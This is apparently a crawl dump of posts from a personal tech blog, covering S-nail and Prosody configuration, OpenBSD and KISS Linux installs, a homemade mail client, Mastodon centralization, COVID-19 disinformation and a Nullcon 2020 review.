Found SUMMARY ['TL;DR: Here’s my .mailrc.\n\nAs I’d mentioned in my blog post about mael, I’ve been on\nthe lookout for a good, usable mail client. As it happens, I found\nS-nail just as I was about to give up on mael. Turns out writing an MUA\nisn’t all too easy after all. S-nail turned out to be the perfect client\nfor me, but I had to invest quite some time in reading the very\nthorough manual and exchanging\nemails with its very friendly author. I did it\nso you don’t have to1, and I present to you\nthis guide.\n\nbasic settings\n\nThese settings below should guarantee some sane defaults to get started\nwith. Comments added for context.\n# enable upward compatibility with S-nail v15.0\nset v15-compat\n\n# charsets we send mail in\nset sendcharsets=utf-8,iso-8859-1\n\n# reply back in sender's charset\nset reply-in-same-charset\n\n# prevent stripping of full names in replies\nset fullnames\n\n# adds a 'Mail-Followup-To' header; useful in mailing lists\nset followup-to followup-to-honour-ask-yes\n\n# asks for an attachment after composing\nset askattach\n\n# marks a replied message as answered\nset markanswered\n\n# honors the 'Reply-To' header\nset reply-to-honour\n\n# automatically launches the editor while composing mail interactively\nset editalong\n\n# I didn't fully understand this :) \nset history-gabby=all\n\n# command history storage\nset history-file=~/.s-nailhist\n\n# sort mail by date (try 'thread' for threaded view)\nset autosort=date\n\nauthentication\n\nWith these out of the way, we can move on to configuring our\naccount — authenticating IMAP and SMTP. Before that, however, we’ll\nhave to create a ~/.netrc file to store our account credentials.\n\n(This of course, assumes that your SMTP and IMAP credentials are the\nsame. I don’t know what to do otherwise. )\nmachine *.domain.tld login user@domain.tld password hunter2\n\nOnce done, encrypt this file using gpg / gpg2. This is optional, but\nrecommended.\n$ gpg2 --symmetric --cipher-algo AES256 -o .netrc.gpg .netrc\n\nYou can now delete the plaintext .netrc file. Now add these lines to\nyour .mailrc:\nset netrc-lookup\nset netrc-pipe='gpg2 -qd ~/.netrc.gpg'\n\nBefore we define our account block, add these two lines for a nicer IMAP\nexperience:\nset imap-cache=~/.cache/nail\nset imap-keepalive=240\n\nDefining an account is dead simple.\naccount "personal" {\n    localopts yes\n    set from="Your Name <user@domain.tld>"\n    set folder=imaps://imap.domain.tld:993\n\n    # copy sent messages to Sent; '+' indicates subdir of 'folder' \n    set record=+Sent\n    set inbox=+INBOX\n    \n    # optionally, set this to 'smtps' and change the port accordingly\n    # remove 'smtp-use-starttls'\n    set mta=smtp://smtp.domain.tld:587 smtp-use-starttls\n\n    # couple of shortcuts to useful folders\n    shortcut sent +Sent \\\n        inbox +INBOX \\\n        drafts +Drafts \\\n        trash +Trash \\\n        archives +Archives\n}\n\n# enable account on startup\naccount personal\n\nYou might also want to trash mail, instead of perma-deleting them\n(delete does that). To achieve this, we define an alias:\ndefine trash {\n    move "$@" +Trash\n}\n\ncommandalias del call trash\n\nReplace +Trash with the relative path to your trash folder.\n\naesthetics\n\nThe fun stuff. I don’t feel like explaining what these do (hint: I don’t\nfully understand it either), so just copy-paste it and mess around with\nthe colors:\n# use whatever symbol you fancy\nset prompt='> '\n\ncolour 256 sum-dotmark ft=bold,fg=13 dot\ncolour 256 sum-header fg=007 older\ncolour 256 sum-header bg=008 dot\ncolour 256 sum-header fg=white\ncolour 256 sum-thread bg=008 dot\ncolour 256 sum-thread fg=cyan\n\nThe prompt can be configured more extensively, but I don’t need it. Read\nthe man page if you do.\n\nessential commands\n\nEh, you can just read the man page, I guess. But here’s a quick list off\nthe top of my head:\n\n\nheaders: Lists all messages, with the date, subject etc.\nmail: Compose mail.\n<number>: Read mail by specifiying its number on the message list.\ndelete <number>: Delete mail.\nnew <number>: Mark as new (unread).\nfile <shortcut or path to folder>: Change folders. For example: file\nsent\n\n\nThat’s all there is to it.\n\nThis is day 2 of the #100DaysToOffload challenge. I didn’t think I’d\nparticipate, until today. So yesterday’s post is day 1. Will I keep at\nit? I dunno. We’ll see.\n\n\n\n\n\n\nHonestly, read the man page (and email Steffen!) — there’s\na ton of useful options in there.\n\n\n\n'] at ['https://icyphox.sh/blog/s-nail']

Found SUMMARY ['No, really. Do you actually understand why the Mastodon network exists,\nand what it stands for, or are you just LARPing? If you’re going to just\ncross-post from Twitter, why are you even on Mastodon?\n\nOkay, so Mastodon is a “federated network”. What does that mean? You\nhave a bunch of instances, each having their own userbase, and each\ninstance federates with other instances, forming a distributed\nnetwork. Got that? Cool. Now let’s get to the problem with\nmastodon.social.\n\nmastodon.social is the instance run by the lead developer. Why does\neverybody flock to it? I’m really not sure, but if I were to hazard\na guess, I’d say it’s because people don’t really understand federation.\n“Oh, big instance? I should probably join that.” Herd mentality?\nI dunno.\n\nAnd what happens when every damn user joins just one instance? It becomes\nmore Twitter, that’s what. The federation is gone. Nearly all activity\nis generated from just one instance. Here are some numbers:\n\n\nTotal number of users on Mastodon: ~2.2 million.\nNumber of users on mastodon.social: 529923\n\n\nSurprisingly, there’s an instance even bigger than\nmastodon.social — pawoo.net. I have no idea why it’s so big and it’s\nprimarily Japanese. Its user count is over 620k. So mastodon.social and\npawoo.net put together form over 1 million users, that’s more than 50%\nof the entire Mastodon populace. That’s nuts.1\n\nAnd you’re only enabling this centralization by joining mastodon.social! Really, what\neven is there on mastodon.social? Have you even seen its local\ntimeline? Probably not. Join an instance with more flavor. Are you into,\nsay, the BSDs? Join bsd.network. Free software? fosstodon.org. Or host\nyour own for yourself and your friends.\n\nIf you really do care about decentralization and freedom, and aren’t\njust memeing to look cool on Twitter, then move your account to another\ninstance.2\n\n\n\n\n\n\nhttps://rosenzweig.io/blog/the-federation-fallacy.html\n\nGo to /settings/migration from your instance’s web\n page.\n\n\n\n'] at ['https://icyphox.sh/blog/mastodon-social']

Found SUMMARY ['My existing KISS install broke because I thought it would be a great\nidea to have apk-tools\nalongside the kiss package manager. It’s safe to say, that did not end\nwell — especially when I installed, and then removed a package. With\na semi-broken install that I didn’t feel like fixing, I figured I’d give\nOpenBSD a try. And I did.\n\ninstallation and setup\n\nRan into some trouble booting off the USB initially, turned out to be\na faulty stick. Those things aren’t built to last, sadly. Flashed a new\nstick, booted up. Setup was pleasant, very straightforward. Didn’t\nreally have to intervene much.\n\nAfter booting in, I was greeted with a very archaic looking FVWM\ndesktop. It’s not the prettiest thing, and especially annoying to work\nwith when you don’t have your mouse setup, i.e. no tap-to-click.\n\nI needed wireless, and my laptop doesn’t have an Ethernet port. USB\ntethering just works, but the connection kept dying. I’m not sure why.\nInstead, I downloaded the iwm(4)\nfirmware from here, loaded\nit up on a USB stick and copied it over to /etc/firmware. After that,\nit was as simple as running\nfw_update(1)\nand the firmware is auto-detected and loaded. In fact, if you have working\nInternet, fw_update will download the required firmware for you, too.\n\nConfiguring wireless is painless and I’m so glad to see that there’s no\nwpa_supplicant horror to deal with. It’s as simple as:\n$ doas ifconfig iwm0 nwid YOUR_SSID wpakey YOUR_PSK\n\nAlso see hostname.if(5) to make\nthis persist. After that, it’s only a matter of specifying your desired\nSSID, and ifconfig will automatically auth and procure an IP lease.\n$ doas ifconfig iwm0 nwid YOUR_SSID\n\nBy now I was really starting to get exasperated by FVWM, and decided to\nswitch to something nicer. I tried building 2bwm (my previous WM), but\nthat failed. I didn’t bother trying to figure this out, so I figured I’d\ngive cwm(1) a shot. Afterall, people\nsing high praises of it.\n\nAnd boy, is it good. The config is a breeze, and actually pretty\npowerful. Here’s mine.\ncwm also has a built-in launcher, so dmenu isn’t necessary anymore.\nRefer to cwmrc(5) for all the config\noptions.\n\nTouchpad was pretty simple to setup too — OpenBSD has\nwsconsctl(8), which lets you set\nyour tap-to-click, mouse acceleration etc. However, more advanced\nconfiguration can be achieved by getting Xorg to use the Synaptics\ndriver. Just add a 70-synaptics.conf to /etc/X11/xorg.conf.d (make\nthe dir if it doesn’t exist), containing:\nSection "InputClass"\n\tIdentifier "touchpad catchall"\n\tDriver "synaptics"\n\tMatchIsTouchpad "on"\n    Option "TapButton1" "1"\n    Option "TapButton2" "3"\n    Option "TapButton3" "2"\n    Option "VertEdgeScroll" "on"\n    Option "VertTwoFingerScroll" "on"\n    Option "HorizEdgeScroll" "on"\n    Option "HorizTwoFingerScroll" "on"\n\tOption "VertScrollDelta" "111"\n\tOption "HorizScrollDelta" "111"\nEndSection\t\n\nThere are a lot more options that can be configured, see\nsynaptics(4).\n\nSuspend and hibernate just work, thanks to\napm(8). Suspend on lid-close just needs\none sysctl tweak:\n$ sysctl machdep.lidaction=1\n\nI believe it’s set to 1 by default on some installs, but I’m not sure.\n\nimpressions\n\nI already really like the philosophy of OpenBSD — security and\nsimplicity, while not losing out on sanity. The default install is\nplentiful, and has just about everything you’d need to get going.\nI especially enjoy how everything just works! I was pleasantly surprised\nto see my brightness and volume keys work without any configuration!\nIt’s clear that the devs\nactually dogfood OpenBSD, unlike uh, cough Free- cough. Gosh I hope\nit’s not the flu. :^)\n\nOh and did you notice all the manpage links I’ve littered throughout\nthis post? They have manpages for everything; it’s ridiculous. And\nthey’re very thorough. Arch Wiki is good, but it’s incorrect at times,\nor simply outdated. OpenBSD’s manpages, although catering only to\nOpenBSD have never failed me.\n\nPerformance and battery life are fine. Battery is in fact, identical, if\nnot better than on Linux. OpenBSD disables HyperThreading/SMT for\nsecurity reasons, but you can manually enable it if you wish to do so:\n$ sysctl hw.smt=1\n\nPackage management is probably the only place where OpenBSD falls short.\npkg_add(1) isn’t particularly fast,\nconsidering it’s written in Perl. The ports selection is fine, I have\nyet to find something that I need not on there. I also wish they\ndebloated packages; maybe I’ve just been spoilt by KISS. I now have\nD-Bus on my system thanks to Firefox. :(\n\nI appreciate the fact that they don’t have a political document — a Code\nof Conduct. CoCs are awful, and have only proven to be harmful for\nprojects; part of the reason why I’m sick of Linux and its community.\nOh wait, OpenBSD does have one: https://www.openbsd.org/mail.html\n;)\n\nI’ll be exploring vmd(8) to see if I can\nget a Linux environment going. Perhaps that’ll be my next post, but when\nhave I ever delivered?\n\nI’ll close this post off with my new rice, and a sick ASCII art I made.\n      \\. -- --./  \n      / ^ ^ ^ \\\n    (o)(o) ^ ^ |_/|\n     {} ^ ^ > ^| \\|\n      \\^ ^ ^ ^/\n       / -- --\\\n                    ~icy\n\n\n'] at ['https://icyphox.sh/blog/openbsd-hp-envy']

Found SUMMARY ['I installed KISS early in January on my main\nmachine — an HP Envy 13 (2017), and I have since noticed a lot of changes\nin my workflow, my approach to software (and its development), and in\nlife as a whole. I wouldn’t call KISS “life changing”, as that would be\noverly dramatic, but it has definitely reshaped my outlook towards\ntechnology — for better or worse.\n\nWhen I talk about KISS to people — online or IRL—-I get some pretty\ninteresting reactions and comments.1\nRanging from “Oh cool.” to “You must be\nretarded.”, I’ve heard it all. A classic and a personal favourite of\nmine, “I don’t use meme distros because I actually get work done.” It is\nactually, quite the opposite — I’ve been so much more productive using\nKISS than any other operating system. I’ll explain why shortly.\n\nThe beauty of this “distro”, is it isn’t much of a distribution at all.\nThere is no big team, no mailing lists, no infrastructure. The entire\nsetup is so loose, and this makes it very convenient to swap things out\nfor alternatives. The main (and potentially community) repos all reside\nlocally on your system. In the event that Dylan decides to call it\nquits and switches to Windows, we can simply just bump versions\nourselves, locally! The KISS Guidestones\ndocument is a good read.\n\nIn the subseqent paragraphs, I’ve laid out the different things about\nKISS that stand out to me, and make using the system a lot more\nenjoyable.\n\nthe package system\n\nPackaging for KISS has been delightful, to say the least. It takes me\nabout 2 mins to write and publish a new package. Here’s the radare2\npackage, which I maintain, for example.\n\nThe build file (executable):\n#!/bin/sh -e\n\n./configure \\\n    --prefix=/usr\n\nmake\nmake DESTDIR="$1" install\n\nThe version file:\n4.3.1 1\n\nThe checksums file (generated using kiss checksum radare2):\n4abcb9c9dff24eab44d64d392e115ae774ab1ad90d04f2c983d96d7d7f9476aa  4.3.1.tar.gz\n\nAnd finally, the sources file:\nhttps://github.com/radareorg/radare2/archive/4.3.1.tar.gz\n\nThis is literally the bare minimum that you need to define a package.\nThere’s also the depends file where you specify the dependencies for\nyour package.\nkiss also generates a manifests file to track all the files and\ndirectories that your package creates during installation, for their\nremoval, if and when that occurs. Now compare this process with any\nother distribution’s.\n\nthe community\n\nAs far as I know, it mostly consists of the #kisslinux channel on\nFreenode and the r/kisslinux\nsubreddit. It’s not that big, but it’s suprisingly active, and super\nhelpful. There have been some interested new KISS-related projects\ntoo: kiss-games — a repository\nfor, well, Linux games; kiss-ppc64le\nand kiss-aarch64 — KISS\nLinux ports for PowerPC and ARM64 architectures;\nwyvertux — an attempt at\na GNU-free Linux distribution, using KISS as a base; and tons more.\n\nthe philosophy\n\nSoftware today is far too complex. And its complexity is only growing.\nSome might argue that this is inevitable, and it is in fact progress.\nI disagree. Blindly adding layers and layers of abstraction (Docker,\nmodern web “apps”) isn’t progress. Look at the Linux desktop ecosystem\ntoday, for example — monstrosities like GNOME and KDE are a result of\nthis…new wave software engineering.\n\nI see KISS as a symbol of defiance against this malformed notion. You\ndon’t need all the bloat these DEs ship with to have a usable system.\nAgreed, it’s a bit more effort to get up and running, but it is entirely\nworth it. Think of it as a clean table — feels good to sit down and work on,\ndoesn’t it?\n\nLet’s take my own experience, for example. One of the initial few\nsoftware I used to install on a new system was dunst — a notification\ndaemon. Unfortunately, it depends on D-Bus, which is Poetterware; ergo,\nnot on KISS. However, using a system without notifications has been very\npleasant. Nothing to distract you while you’re in the zone.\n\nAnother instance, again involving D-Bus (or not), is Bluetooth audio. As\nit happens, my laptop’s 3.5mm jack is rekt, and I need to use Bluetooth\nfor audio, if at all. Sadly, Bluetooth audio on Linux hard-depends on\nD-Bus. Bluetooth stacks that don’t rely on D-Bus do exist, like on Android,\nbut porting them over to desktop is non-trivial. However, I used this to\nmy advantage and decided not to consume media on my laptop. This has\ndrastically boosted my productivity, since I literally cannot watch\nYouTube even if I wanted to. My laptop is now strictly work-only.\nIf I do need to watch the occasional video / listen to music, I use my\nphone. Compartmentalizing work and play to separate devices has worked\nout pretty well for me.\n\nI’m slowly noticing myself favor low-tech (or no-tech) solutions to\nsimple problems too. Like notetaking — I’ve tried plaintext files, Vim\nWiki, Markdown, but nothing beats actually using pen and paper. Tech,\nfrom what I can see, doesn’t solve problems very effectively. In some\ncases, it only causes more of them. I might write another post\ndiscussing my thoughts on this in further detail.\n\nI’m not sure what I intended this post to be, but I’m pretty happy with\nthe mindspill. To conclude this already long monologue, let me clarify\none little thing y’all are probably thinking, “Okay man, are you\nsuggesting that we regress to the Dark Ages?”. No, I’m not suggesting\nthat we regress, but rather, progress mindfully.\n\n\n\n\n\n\nNo, I don’t go “I use KISS btw”. I don’t bring it\nup unless provoked.\n\n\n\n'] at ['https://icyphox.sh/blog/kiss-zen']

Found SUMMARY ['Update: The code lives here: https://github.com/icyphox/mael\n\nI’ve been on the lookout for a good terminal-based email client since\nforever, and I’ve tried almost all of them. The one I use right now\nsucks a little less — aerc. I have\nsome gripes with it though, like the problem with outgoing emails not\ngetting copied to the Sent folder, and instead erroring out with\na cryptic EOF — that’s literally all it says.\nI’ve tried mutt, but I find it a little excessive. It feels like the\nweechat of email — to many features that you’ll probably never use.\n\nI need something clean and simple, less bloated (for the lack of\na better term). This is what motivated me to try writing my own. The\nresult of this (and not to mention, being holed up at home with nothing\nbetter to do), is mael.1\n\nmael isn’t like your usual TUI clients. I envision this to turn out\nsimilar to mailx — a prompt-based UI. The reason behind this UX decision\nis simple: it’s easier for me to write. :)\n\nSpeaking of writing it, it’s being written in a mix of Python and bash.\nWhy? Because Python’s email and mailbox modules are fantastic, and\nI don’t think I want to parse Maildirs in bash. “But why not pure\nPython?” Well, I’m going to be shelling out a lot (more on this in a bit),\nand writing interactive UIs in bash is a lot more intuitive, thanks to\nsome of the nifty features that later versions of bash have — read,\nmapfile etc.\n\nThe reason I’m shelling out is because two key components to this\nclient, that I haven’t yet talked about — mbsync and msmtp are in\nuse, for IMAP and SMTP respectively. And mbsync uses the Maildir\nformat, which is why I’m relying on Python’s mailbox package. Why is\nthis in the standard library anyway?!\n\nThe architecture of the client is pretty interesting (and possibly very\nstupid), but here’s what happens:\n\n\nUI and prompt stuff in bash\nemails are read using less\nemail templates (RFC 2822) are parsed and generated in Python\nthis is sent to bash in STDOUT, like\n\nmsg="$(./mael-parser "$maildir_message_path")"\n\nThese kind of one-way (bash –> Python) calls are what drive the entire\nprocess. I’m not sure what to think of it. Perhaps I might just give up\nand write the entire thing in Python.\nOr…I might just scrap this entirely and just shut up and use aerc.\nI don’t know yet. The code does seem to be growing in size rapidly. It’s\nabout ~350 LOC in two days of writing (Python + bash). New problems\narise every now and then and it’s pretty hard to keep track of all of\nthis. It’ll be cool when it’s all done though (I think).\n\nIf only things just worked.\n\n\n\n\n\n\nI have yet to open source it; this post will be updated with\na link to it when I do.\n\n\n\n'] at ['https://icyphox.sh/blog/mael']

There are many actors,\npushing many narratives — some similar, some different.\n\nInterestingly, the three big players in the information warfare\nspace — Russia, Iran and China seem to be running similar stories on\ntheir state-backed media outlets. While they all tend to lean towards\nthe same, fairly anti-U.S. sentiments — that is, blaming the US for\nweaponizing the crisis for political gain — Iran and Russia’s content\ncome off as more…conspiratorial.\nIn essence, they claim that the COVID-19 virus is a “bioweapon”\ndeveloped by the U.S.\n\nRussian news agency\nRT tweeted:\n\n\nShow of hands, who isn’t going to be surprised if it ever gets\nrevealed that #coronavirus is a bioweapon?\n\n\nRT also published\nan article\nmocking the U.S. for concerns over Russian disinformation.\nAnother article by RT,\nan op-ed\nsuggests the virus’ impact on financial markets might bring about the\nreinvention of communism and the end of the global capitalist system.\nRussian state-sponsored media can also be seen amplifying Iranian\nconspiracy theories — including the Islamic Revolutionary Guard Corps’\n(IRGC) suggestion that COVID-19\nis a U.S. bioweapon.\n\nIranian media outlets appear to be running stories having similar\nthemese, as well. Here’s one\nby PressTV,\nwhere they very boldly claim that the virus was developed by\nthe U.S. and/or Isreal, to use as a bioweapon against Iran. Another\nnonsensical piece\nby PressTV suggests that\n“there are components of the virus that are related to HIV that could not have occurred naturally”.\nThe same article pushes another theory:\n\n\nThere has been some speculation that as the Trump Administration has\nbeen constantly raising the issue of growing Chinese global\ncompetitiveness as a direct threat to American national security and\neconomic dominance, it might be possible that Washington has created\nand unleashed the virus in a bid to bring Beijing’s growing economy\nand military might down a few notches. It is, to be sure, hard to\nbelieve that even the Trump White House would do something so\nreckless, but there are precedents for that type of behavior\n\n\nThese “theories”, as is evident, are getting wilder and wilder.\n\nUnsurprisingly, China produces the most amount of content related to the\ncoronavirus, but they’re quite distinct in comparison to Russian and\nIranian media. The general theme behind Chinese narratives is\ncritisizing the West for…a lot of things.\n\nGlobal Times claims that\ndemocracy is an insufficient system\nto battle the coronavirus. They blame the U.S.\nfor unfair media coverage against China, and other anti-China\nnarratives.\nThere are a ton other articles that play the racism/discrimination\ncard — I wouldn’t blame them though. Here’s one.\n\nIn the case of India, most disinfo (actually, misinfo) is mostly just\npseudoscientific / alternative medicine / cures in the form of WhatsApp\nforwards — “Eat foo! Eat bar!”.1\n\nI’ve also been noticing a ton of COVID-19 / coronavirus related domain\nregistrations happening. Expect phishing and malware campaigns using the\nvirus as a theme. In the past 24 hrs, ~450 .com domains alone were\nregistered.\n\n\n\nAnywho, there are bigger problems at hand — like the fact that my uni\nstill hasn’t suspended classes!\n\n\n\n\n\n\nhttps://www.thehindu.com/news/national/coronavirus-group-hosts-cow-urine-party-says-covid-19-due-to-meat-eaters/article31070516.ece\n\n\n\n'] at ['https://icyphox.sh/blog/covid19-disinfo']

Found SUMMARY ['Disclaimer: Political.\n\nThis year’s conference was at the Taj Hotel and Convention center, Dona\nPaula, and its associated party at Cidade de Goa, also by Taj.\nGreat choice of venue, perhaps even better than last time. The food was\nfine, the views were better.\n\nWith those things out of the way — let’s talk talks. I think\nI preferred the panels to the talks — I enjoy a good, stimulating\ndiscussion as opposed to only half-understanding a deeply technical\ntalk — but that’s just me. But there was this one talk that I really\nenjoyed, perhaps due to its unintended comedic value; I’ll get into that\nlater.\n\nThe list of panels/talks I attended in order:\n\nDay 1\n\n\nKeynote: The Metadata Trap by Micah Lee (Talk)\nSecuring the Human Factor (Panel)\nPredicting Danger: Building the Ideal Threat Intelligence Model (Panel)\nLessons from the Cyber Trenches (Panel)\nMlw 41#: a new sophisticated loader by APT group TA505 by Alexey Vishnyakov (Talk)\nTaking the guess out of Glitching by Adam Laurie (Talk)\nKeynote: Cybersecurity in India — Information Assymetry, Cross Border\nThreats and National Sovereignty by Saumil Shah (Talk)\n\n\nDay 2\n\n\nKeynote: Crouching hacker, killer robot? Removing fear from\ncyber-physical security by Stefano Zanero (Talk)\nSupply Chain Security in Critical Infrastructure Systems (Panel)\nPutting it all together: building an iOS jailbreak from scratch by\nUmang Raghuvanshi (Talk)\nHack the Law: Protection for Ethical Cyber Security Research in India\n(Panel)\n\n\nRe: Closing keynote\n\nI wish I could link the talk, but it hasn’t been uploaded just yet. I’ll\ndo it once it has. So, I’ve a few comments I’d like to make on some of\nSaumil’s statements.\n\nHe proposed that the security industry trust the user more, and let them\nmake the decisions pertaining to personal security / privacy.\nExcept…that’s just not going to happen. If all users were capable\nof making good, security-first choices — we as an industry don’t\nneed to exist. But that is unfortunately not the case.\nUsers are dumb. They value convenience and immediacy over\nsecurity. That’s the sad truth of the modern age.\n\nAnother thing he proposed was that the Indian Government build our own\n“Military Grade” and “Consumer Grade” encryption.\n\n…what?\n\nA “security professional” suggesting that we roll our own crypto? What\neven. Oh and, to top it off — when\nRaman, very rightly countered\nsaying that the biggest opponent to encryption is the Government, and\ntrusting them to build safe cryptosystems is probably not wise, he\nresponded by saying something to the effect of “Eh, who cares? If they\nwant to backdoor it, let them.”\n\nBruh moment.\n\nHe also had some interesting things to say about countering\ndisinformation. He said, and I quote “Join the STFU University”.\n\n¿wat? Is that your best solution?\n\nJudging by his profile, and certain other things he said in the talk, it\nis safe to conclude that his ideals are fairly…nationalistic. I’m not\none to police political opinions, I couldn’t care less which way you\nlean, but the statements made in the talk were straight up\nincorrect.\n\nClosing thoughts\n\nThis came out more rant-like than I’d intended. It is also the first\nblog post where I dip my toes into politics. I’ve some thoughts on more\ncontroversial topics for my next entry. That’ll be fun, especially when\nmy follower count starts dropping. LULW.\n\nSaumil, if you ever end up reading this, note that this is not\na personal attack. I think you’re a cool guy.\n\nNote to the Nullcon organizers: you guys did a fantastic job running the\nconference despite Corona-chan’s best efforts. I’d like to suggest one\nlittle thing though — please VET YOUR SPEAKERS more!\n\n\n'] at ['https://icyphox.sh/blog/nullcon-2020']

Found SUMMARY ['Remember the IRC for DMs article I wrote a while\nback? Well…it’s safe to say that IRC didn’t hold up too well. It first\nstarted with the bot. Buggy code, crashed a lot — we eventually gave up\nand didn’t bring the bot back up. Then came the notifications, or lack\nthereof. Revolution IRC has a bug where your custom notification rules\njust get ignored after a while. In my case, this meant that\nnotifications for #crimson stopped entirely. Unless, of course, Nerdy\npinged me each time.\n\nAgain, none of these problems are inherent to IRC itself. IRC is\nfantastic, but perhaps wasn’t the best fit for our usecase. I still do\nuse IRC though, just not for 1-on-1 conversations.\n\nWhy XMPP?\n\nFor one, it’s better suited for 1-on-1 conversations. It also has\nsupport for end-to-end encryption (via OMEMO), something IRC doesn’t\nhave.1 Also, it isn’t centralized (think: email).\n\nSo…Prosody\n\nProsody is an XMPP server. Why did I choose this\nover ejabberd, OpenFire, etc.? No reason, really. Their website looked\ncool, I guess.\n\nInstalling\n\nSetting it up was pretty painless (I’ve experienced\nworse). If you’re on a Debian-derived system, add:\n# modify according to your distro\ndeb https://packages.prosody.im/debian buster main \n\nto your /etc/apt/sources.list, and:\n# apt update\n# apt install prosody\n\nConfiguring\n\nOnce installed, you will find the config file at\n/etc/prosody/prosody.cfg.lua. Add your XMPP user (we will make this\nlater), to the admins = {} line.\nadmins = {"user@chat.example.com"}\n\nHead to the modules_enabled section, and add this to it:\nmodules_enabled = {\n    "posix";\n    "omemo_all_access";\n...\n    -- uncomment these\n    "groups";\n    "mam";\n    -- and any others you think you may need\n}\n\nWe will install the omemo_all_access module later.\n\nSet c2s_require_encryption, s2s_require_encryption, and\ns2s_secure_auth to true.\nSet the pidfile to /tmp/prosody.pid (or just leave it as default?).\n\nBy default, Prosody stores passwords in plain-text, so fix that by\nsetting authentication to "internal_hashed"\n\nHead to the VirtualHost section, and add your vhost. Right above it,\nset the path to the HTTPS certificate and key:\ncertificates = "certs"    -- relative to your config file location\nhttps_certificate = "certs/chat.example.com.crt"\nhttps_key = "certs/chat.example.com.key"\n...\n\nVirtualHost "chat.example.com"\n\nI generated these certs using Let’s Encrypt’s certbot, you can use\nwhatever. Here’s what I did:\n# certbot --nginx -d chat.example.com\n\nThis generates certs at /etc/letsencrypt/live/chat.example.com/. You can\ntrivially import these certs into Prosody’s /etc/prosody/certs/ directory using:\n# prosodyctl cert import /etc/letsencrypt/live/chat.example.com\n\nPlugins\n\nAll the modules for Prosody can be hg clone’d from\nhttps://hg.prosody.im/prosody-modules. You will, obviously, need\nMercurial installed for this.\n\nClone it somewhere, and:\n# cp -R prosody-modules/mod_omemo_all_access /usr/lib/prosody/modules\n\nDo the same thing for whatever other module you choose to install. Don’t\nforget to add it to the modules_enabled section in the config.\n\nAdding users\n\nprosodyctl makes this a fairly simple task:\n$ prosodyctl adduser user@chat.example.com\n\nYou will be prompted for a password. You can optionally, enable\nuser registrations from XMPP/Jabber clients (security risk!), by setting\nallow_registration = true.\n\nI may have missed something important, so here’s my\nconfig for reference.\n\nClosing notes\n\nThat’s pretty much all you need for 1-on-1 E2EE chats. I don’t know much\nabout group chats just yet — trying to create a group in Conversations\ngives a “No group chat server found”. I will figure it out later.\n\nAnother thing that doesn’t work in Conversations is adding an account\nusing an SRV record.2 Which kinda sucks, because having a chat.\nsubdomain isn’t very clean, but whatever.\n\nOh, also — you can message me at\nicy@chat.icyphox.sh.\n\n\n\n\n\n\nI’m told IRC supports OTR, but I haven’t ever tried.\n\nhttps://prosody.im/doc/dns\n\n\n\n'] at ['https://icyphox.sh/blog/prosody']

Not really, but we’ll see.\n\nNo more Cloudflare!\n\nYep. If you weren’t aware — pre-2020 this site was behind Cloudflare\nSSL and their DNS. I have since migrated off it to\nhe.net, thanks to highly upvoted Lobste.rs comment.\nBecause of this switch, I infact, learnt a ton about DNS.\n\nMigrating to HE was very painless, but I did have to research a lot\nabout PTR records — Cloudflare kinda dumbs it down.

Yeah, I lost interest. Apparently writing C and\nncurses isn’t very fun or stimulating.\n\nThis also means I’m back on weechat.

Found SUMMARY ['After having recently installed KISS, and\nbuilding Firefox from source, I was exposed to the true monstrosity that\nFirefox — and web browsers in general—-is. It took all of 9 hours to\nbuild the dependencies and then Firefox itself.\n\nSure, KISS now ships Firefox binaries in the\nfirefox-bin\npackage; I decided to get rid of that slow mess anyway.\n\nEnter vimb\n\nvimb is a browser based on\nwebkit2gtk, with a Vim-like interface.\nwebkit2gtk builds in less than a minute — it blows Firefox out of\nthe water, on that front.\n\nThere isn’t much of a UI to it — if you’ve used Vimperator/Pentadactyl\n(Firefox plugins), vimb should look familiar to you.\nIt can be configured via a config.h or a text based config file at\n~/.config/vimb/config.\nEach “tab” opens a new instance of vimb, in a new window but this can\nget messy really fast if you have a lot of tabs open.\n\nEnter tabbed\n\ntabbed is a tool to embed X apps\nwhich support xembed into a tabbed UI. This can be used in conjunction\nwith vimb, like so:\ntabbed vimb -e\n\nWhere the -e flag is populated with the XID, by tabbed. Configuring\nFirefox-esque keybinds in tabbed’s config.h is relatively easy. Once\nthat’s done — voilà!

Found SUMMARY ['This new semester has been pretty easy on me, so far. I hardly every\nhave any classes (again, so far), and I’ve a ton of free time on my\nhands. This calls for — yep—-a distro hop!\n\nWhy KISS?\n\nKISS has been making rounds on the interwebz lately.1\nThe Hacker News post spurred quite the discussion. But then again,\nthat is to be expected from Valleybros who use macOS all day. :^)\n\nFrom the website,\n\n\nAn independent Linux® distribution with a focus on simplicity and the\nconcept of “less is more”. The distribution targets only the x86-64\narchitecture and the English language.\n\n\nLike many people did in the HN thread, “simplicity” here is not to be\nconfused with “ease”. It is instead, simplicity in terms of lesser and\ncleaner code — no\nPoetterware.\n\nThis, I can get behind. A clean system with less code is like a clean\ntable. It’s nice to work on. It also implies security to a certain\nextent since there’s a smaller attack surface.\n\nThe kiss package manager is written\nis pure POSIX sh, and does just enough. Packages are compiled from\nsource and kiss automatically performs dependency resolution. Creating\npackages is ridiculously easy too.\n\nSpeaking of packages, all packages — both official & community\nrepos — are run through shellcheck before getting merged. This is\nawesome; I don’t think this is done in any other distro.\n\nIn essence, KISS sucks less.\n\nInstalling KISS\n\nThe install guide is very easy to\nfollow. Clear instructions that make it hard to screw up; that didn’t\nstop me from doing so, however.\n\nDay 1\n\nAlthough technically not in a TTY, it was still not in the KISS\nsystem — I’ll count it. I’d compiled the kernel in the chroot and\ndecided to use efibootmgr instead of GRUB. efibootmgr is a neat tool\nto modify the Intel Extensible Firmware Interface (EFI). Essentially,\nyou boot the .efi directly as opposed to choosing which boot entry\nyou want to boot, through GRUB. Useful if you have just one OS on the\nsystem. Removes one layer of abstraction.\n\nAdding a new EFI entry is pretty easy. For me, the command was:\nefibootmgr --create \n           --disk /dev/nvme0n1 \\\n           --part 1 \\\n           --label KISS Linux \\\n           --loader /vmlinuz\n           --unicode 'root=/dev/nvme0n1p3 rw'  # kernel parameters\n\nMind you, this didn’t work the first time, or the second, or the\nthird … a bunch of trial and error (and asking on #kisslinux)\nlater, it worked.\n\nWell, it booted, but not into KISS. Took a while to figure out that the\nculprit was CONFIG_BLK_DEV_NVME not having been set in the kernel\nconfig. Rebuild & reboot later, I was in.\n\nDay 2\n\nNetworking! How fun. An ip a and I see that both USB tethering\n(ethernet) and wireless don’t work. Great. Dug around a bit — missing\nwireless drivers was the problem. Found my driver, a binary .ucode from\nIntel (eugh!). The whole day was spent in figuring out why the kernel\nwould never load the firmware. I tried different variations — loading\nit as a module (=m), baking it in (=y) but no luck.\n\nDay 3\n\nI then 